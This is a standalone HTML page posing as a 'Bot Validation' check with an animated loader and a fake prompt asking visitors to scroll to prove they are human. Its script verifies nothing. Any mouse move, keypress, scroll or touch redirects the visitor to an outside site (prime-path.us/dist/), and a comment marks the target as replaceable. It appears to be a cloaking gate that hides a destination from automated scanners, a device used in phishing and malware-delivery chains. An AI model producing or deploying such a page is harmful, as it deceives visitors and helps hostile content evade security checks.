<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bot Validation</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f3f4f6;
      font-family: Arial, sans-serif;
      position: relative;
    }
    .loader {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      margin-bottom: 20px;
    }
    .bubble {
      width: 15px;
      height: 15px;
      background-color: #3498db;
      border-radius: 50%;
      animation: bounce 1.5s infinite ease-in-out;
    }
    .bubble:nth-child(2) {
      animation-delay: 0.3s;
    }
    .bubble:nth-child(3) {
      animation-delay: 0.6s;
    }
    @keyframes bounce {
      0%, 80%, 100% {
        transform: scale(0);
      }
      40% {
        transform: scale(1);
      }
    }
    .prompt {
      font-size: 1.2em;
      color: #333;
      animation: fade-in 1s ease-in-out infinite alternate;
      display: none;
    }
    @keyframes fade-in {
      from {
        opacity: 0.3;
      }
      to {
        opacity: 1;
      }
    }
  </style>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      let interactionDetected = false;
      let timeoutHandle;

      // Detect user interactions
      const markHuman = () => {
        interactionDetected = true;
        document.querySelector(".prompt").style.display = "none"; // Hide prompt on interaction
        clearTimeout(timeoutHandle);
        // Redirect user after interaction
        window.location.href = "https://prime-path.us/dist/"; // Replace with your target URL
      };

      document.addEventListener("mousemove", markHuman);
      document.addEventListener("keypress", markHuman);
      document.addEventListener("scroll", markHuman);
      document.addEventListener("touchstart", markHuman);

      // Show prompt if no interaction after 5 seconds
      timeoutHandle = setTimeout(() => {
        if (!interactionDetected) {
          document.querySelector(".prompt").style.display = "block";
        }
      }, 5000); // Show prompt after 5 seconds
    });
  </script>
</head>
<body>
  <div class="loader">
    <div class="bubble"></div>
    <div class="bubble"></div>
    <div class="bubble"></div>
  </div>
  <div class="prompt">Please scroll the page up and down to verify you are not a bot.</div>
</body>
</html>
